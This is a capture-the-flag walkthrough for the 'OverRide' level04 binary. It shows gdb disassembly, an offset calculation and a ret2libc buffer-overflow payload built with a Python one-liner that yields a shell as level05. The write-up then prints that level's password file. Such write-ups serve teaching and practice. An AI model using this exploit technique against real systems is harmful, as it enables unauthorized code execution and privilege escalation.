## WALKTHROUGH - LEVEL04

---

When we look at the binary, we can see that there a gets call that is not protected. So we can assume we can overwrite the main return address:

```
 8048757:	8d 44 24 20          	lea    eax,[esp+0x20]
 804875b:	89 04 24             	mov    DWORD PTR [esp],eax
 804875e:	e8 4d fd ff ff       	call   80484b0 <gets@plt>
```

To do that, we need to calculate **the number of bytes** we'll need to **put in the buffer** to **have access to the return address**. We're going to use **gdb**, and set a **breakpoint after the sub** to **get the addresses of $ebp and $esp**, and make our calcul:

```
 80486d0:	81 ec b0 00 00 00    	sub    esp,0xb0
 80486d6:	e8 75 fe ff ff       	call   8048550 <fork@plt>
```

```gdb
Breakpoint 1, 0x080486db in main ()
(gdb) info reg $esp $ebp
esp            0xffffd560	0xffffd560
ebp            0xffffd618	0xffffd618
(gdb) p/x 0xffffd560+0x20
$2 = 0xffffd580
(gdb) p 0xffffd618-0xffffd580+0x4
$4 = 156
```

We can then **overwrite EIP** after we write **156 bytes** in the buffer.

We will use a **Ret2libc attack** to give us a shell, so we need to find the address of the **system** function and the address of a string that contains **"/bin/sh"**.

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
[...]
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
    [...]
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
    [...]

(gdb) find 0xf7e2c000, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

Now we need to pass everything to the stack, so the payload will be:

**"A"\*156 + system address + system return address + system parameters**

```sh
level04@OverRide:~$ chmod 777 .
level04@OverRide:~$ python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'  > payload
level04@OverRide:~$ cat payload - | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
